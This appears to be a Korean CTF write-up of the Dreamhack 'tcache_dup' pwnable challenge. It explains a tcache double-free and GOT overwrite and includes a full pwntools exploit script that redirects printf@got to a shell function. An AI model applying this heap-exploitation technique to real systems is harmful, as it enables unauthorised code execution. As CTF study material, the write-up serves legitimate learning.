---
title: '[Dreamhack] tcache_dup'
description: Dremhack [Wargame] - tcache_dup
author: juhyeongkim
date: 2024-10-31 08:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/60)

## 바이너리 분석

```c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler()
{
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt)
{
    int size;

    if (cnt > 10)
    {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if (!ptr[cnt])
    {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete()
{
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if (idx > 10)
    {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    int idx;
    int cnt = 0;

    initialize();

    while (1)
    {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx)
        {
        case 1:
            create(cnt);
            cnt++;
            break;
        case 2:
            delete ();
            break;
        default:
            break;
        }
    }

    return 0;
}

```

<img width="245" alt="image" src="https://github.com/user-attachments/assets/5ca76686-c08a-4efb-9715-67d427536309">

일단 이번 문제에서는 `Partial RELRO`이고, `PIE`가 적용되어있지 않아서 `libc base`를 Leak할 필요 없이 바이너리에 존재하는 `GOT`와 `get_shell` 함수 주소를 바로 구해서, `GOT Overwrite`가 가능할 것이다.

근데, 이번 문제를 처음 봤을 때 아무리 봐도 어떻게 접근해야 하는지 감을 잡을 수 없었다.

왜냐하면 `Double Free` 탐지를 우회하기 위해서는 `tcache poisoning`을 해야 한다. 그러기 위해서는 할당 후 `free` 된 청크에 접근해서 값을 바꾼 후 다시 `free`해서 `Double Free Bug`를 일으켜야 하는데,

에전에 풀었던 `Tcache Poisoning` 문제에 존재하던, 해제된 청크를 `edit`하는 함수가 이번 문제에서는 존재하지 않아서 `tcache` 연결 리스트에 접근해서 청크의 값을 수정하는 것이 불가능하다.

그리고 조금의 어떻게 방법을 찾아보려고 해도, `cnt`를 인덱스로 하여, `ptr`에  청크를 할당하는 `create` 함수를 호출하고 난 후에는 `cnt++`을 해주기 때문에 한번 할당하고 해제한 청크의 주소를 바로 다시 접근하는 것도 불가능하다.

너무 모르겠어서 구글링해서 약간 힌트만 얻자는 생각으로 찾아봤는데, 로컬에서는 아래와 같이 동일한 청크를 두번 할당하면 `Double Free`가 탐지되며 종료되지만, 원격 서버에 접속하여 똑같은 과정을 수행하면 이상하게 `Double Free`가 탐지되지 않는다.

<br>

### Local

<img width="644" alt="image" src="https://github.com/user-attachments/assets/687eac35-ae38-4823-830c-6a08aca40cef">

<br>

### Remote

<img width="602" alt="image" src="https://github.com/user-attachments/assets/bd0af56f-141a-41db-b8ac-d5988d0e29ef">

사실 이러면 `Double Free`를 그냥 아무 조건 없이 한 후에 `printf@got` 청크를 `tcache`에 추가해준 후, 해당 청크를 할당하며 `get_shell`의 주소를 대입해주면 끝이다.

로컬과 리모트에서 차이가 난 이유는, **같은 `libc` 라이브러리를 사용하더라도 힙과 관련된 기능은 `OS`와 `glibc`의 영향도 받는다고 한다.**

로컬은 `Ubuntu 22.04`이지만, 도커파일에서도 확인할 수 있듯이 리모트는 `Ubuntu 18.04`일 것이다. 사실 `Ubuntu 18.04`에서도 `Double Free`는 적용되어 있지만, 리모트에서는 `glibc 2.26` 버전 정도를 써서 `tcache`가 막 도입된 버전일 것이다.

<br>

### 참고

바이너리를 실행하자마자, 할당을 해주지 않고 `free`를 2번 연속 해주면 `Double Free`에 걸리지 않는다. 

왜냐하면, 할당된 힙주소가 저장되는 `char * ptr[10]`은 전역 변수이므로 처음에 전부 `0x0`으로 초기화되어 있기 때문에 `free((void *)NULL)`은 아무 동작을 하지 않는다. (안전한 수행으로 친다.)

따라서, 로컬에서도 이건 당연히 `Double Free` 탐지에 걸리지 않는다. 대신에 `free(NULL)`은 당연히 `tcache`에는 아무 청크도 더해지지 않는다.

그리고, 해당 문제 환경에서는 `tc_idx`가 도입되지 않아서, `edit`으로 `tc_idx`를 조작할 수 없어서 `tc_idx = 0`이 되어도 `tcache`에서 청크를 꺼낼 수 있어서 익스플로잇이 가능하다.

<br>

## Exploit

`tcache`의 크기 범위에 해당하는 하나의 청크를 `malloc` 후, `free`를 2번 해주면 알아서 `tcache poisoning`이 가능하다.

이후 `duplicated`된 청크를 `malloc`으로 재할당 하여 해당 청크에 `printf@got`를 대입해주면 `tcache` 연결 리스트 엔트리에 `printf@got`가 추가되게 된다.

그런 다음에 `duplicated`된 나머지 청크 하나를 `malloc`으로 재할당하여 빼주고, 다시 `malloc`을 해서 `printf@got`를 빼주면서 `get_shell`의 주소를 대입해주면 `GOT Overwrite`를 성공하게 된다.

참고로 `GOT` 는 `.bss` 영역에 존재하고 `PIE`가 적용되어있지 않아서 `gdb`로 바로 확인할 수도 있고, 바이너리에서 `pwntools`로 구해도 된다. (갑자기 `got`가 `libc`에 있다고 착각했는데 바이너리의 `.bss`에 존재하는 것을 잘 기억하자. `plt`는 바이너리의 `code` 영역)

<img width="358" alt="image" src="https://github.com/user-attachments/assets/cf5c3f26-83c6-4be9-8a5d-e0c0cb212a5a">

<img width="845" alt="image" src="https://github.com/user-attachments/assets/1e7cf648-5482-4d70-844a-c83f9748947f">

**`got` 주소 : `0x601038`**

<br>

```py
from pwn import *

p = remote('host3.dreamhack.games', 24519)
elf = ELF('./tcache_dup')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())


create(0x20, b'a')


# tcache[0x20] : chunk (1)
delete(0)  # (1)


# tcache[0x20] : chunk(2) -> chunk (1)
delete(0)  # (2)


printf_got = elf.got['printf']
# tcache[0x20] : chunk(1) -> printf@got
create(0x20, p64(printf_got))


# tcache[0x20] : printf@got
create(0x20, b'a')


get_shell = elf.symbols['get_shell']
# tcache[0x20] : empty

create(0x20, p64(get_shell))

p.interactive()
```
